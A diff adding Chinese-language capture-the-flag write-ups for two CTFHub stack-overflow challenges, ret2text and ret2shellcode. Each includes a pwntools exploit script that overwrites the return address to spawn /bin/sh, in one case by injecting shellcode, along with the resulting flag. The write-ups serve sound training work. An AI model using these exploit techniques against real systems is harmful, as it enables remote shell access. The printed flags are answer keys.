@@ -1,5 +1,86 @@
 # Pwn
 
+## CTFHub
+
+### ret2text
+
+先`file ./ret2text`查看文件类型再`checksec --file=./ret2text`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/1.png)
+
+用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`v4`中，`v4`的长度只有`0x70`，即可用栈大小只有`112`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/2.png)
+
+双击`v4`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x70`个字节占满`s`变量，然后再加上`r`的`8`个字节。
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/3.png)
+
+在`Function Window`中注意到有一个名为`secure()`的函数，函数中当`scanf()`输入的`v2`变量和`rand()`函数生成的`v3`变量值相等时，会发生系统调用，因此构造`payload`时需要再加上`system('/bin/sh')`函数的地址即可。
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/4.png)
+
+编写`Python`代码即可得到`ctfhub{f878895b3600b2e2192e5c9a}`。
+
+```python
+from pwn import *
+
+io = remote('challenge-e20ddfc12b209019.sandbox.ctfhub.com', 34749)
+payload = b'a'*0x70 + b'fuckpwn!' + p64(0x4007B8)
+io.sendlineafter('Welcome to CTFHub ret2text.Input someting:\n', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/5.png)
+
+提交`ctfhub{f878895b3600b2e2192e5c9a}`即可。
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/6.png)
+
+------
+
+### ret2shellcode
+
+先`file ./ret2shellcode`查看文件类型再`checksec --file=./ret2shellcode`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/1.png)
+
+用`IDA Pro 64bit`打开附件`ret2shellcode`，按`F5`反汇编源码并查看主函数，发现`buf`变量的地址被`printf()`函数输出了，然后`read()`函数读取输入到变量`buf`中，`char`型变量`buf`的长度只有`0x10`，即可用栈大小只有`10`字节，但是`read()`函数限制输入`0x400`个字节，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/2.png)
+
+双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x10`个字节占满`s`变量，然后再加上`r`的`8`个字节。
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/3.png)
+
+由于`checksec`时发现`NX disabled`，即程序没有开`NX`保护，栈的数据段可以执行。虽然程序中并没有`system()`函数和`/bin/sh`，但是`buf`变量的栈地址被`printf()`函数泄露出来了，因此可以尝试让程序跳转到我们构造的`shellcode`中，并在栈溢出后返回到栈的数据段上执行，就能得到`shell`权限了。
+
+```python
+from pwn import *
+
+context(os="linux", arch="amd64", log_level='debug')
+# io = process('ret2shellcode')
+io = remote('challenge-90f37d9c89a2800a.sandbox.ctfhub.com', 33884)
+io.recvuntil(b'[')
+buf_address = int(io.recvuntil(b']')[:-1].decode('utf-8'), 16)
+log.success('buf_address => %s' % hex(buf_address).upper())
+shellcode_address = buf_address+0x20 # buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8
+log.success('buf_address => %s' % hex(shellcode_address).upper())
+shellcode = asm(shellcraft.sh())
+payload = b'a'*0x10 + b'fuckpwn!' + p64(shellcode_address) + shellcode
+io.recv()
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/4.png)
+
+`ls`可以看到有个`flag`文件，`cat flag`拿到`ctfhub{f878895b3600b2e2192e5c9a}`提交即可。
+
+![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/5.png)
+
+------
+
 ## BUUCTF
 
 ### [test_your_nc](https://buuoj.cn/challenges#test_your_nc)
